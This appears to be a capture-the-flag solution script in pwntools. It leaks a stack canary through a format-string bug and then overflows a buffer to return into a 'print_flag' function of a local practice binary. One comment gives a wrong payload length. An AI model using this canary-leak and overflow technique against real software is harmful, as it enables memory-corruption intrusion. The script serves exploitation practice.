#!/usr/bin/env python3
from pwn import *
import re

# --- Exploit Configuration ---
CANARY_LEAK_OFFSET = 19
PADDING_TO_CANARY = 72
RBP_PADDING = 8
# Total Payload length: 72 (buffer) + 8 (canary) + 8 (RBP) = 80 bytes

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
r.sendline(f"%{CANARY_LEAK_OFFSET}$lx".encode()) 

val = r.recvuntil(b"What's your message? ") 
canary_match = re.search(b"Hello, ([0-9a-fA-F]+)\n", val)

if canary_match:
    leaked_canary_hex = canary_match.group(1)
    # Convert hex string to 64-bit packed value
    canary_int = int(leaked_canary_hex, 16)
    leaked_canary_p64 = p64(canary_int)
    log.info(f"Canary: {canary_int:x}")
else:
    log.critical("Canary extraction failed.")
    r.close()
    exit()

# --- PAYLOAD CONSTRUCTION ---
win = exe.symbols['print_flag']
target_rip = p64(win)
padding = b"A" * PADDING_TO_CANARY
rbp_padding = b"B" * RBP_PADDING
payload = padding + leaked_canary_p64 + rbp_padding + target_rip

r.sendline(payload)

r.recvline() 
r.interactive()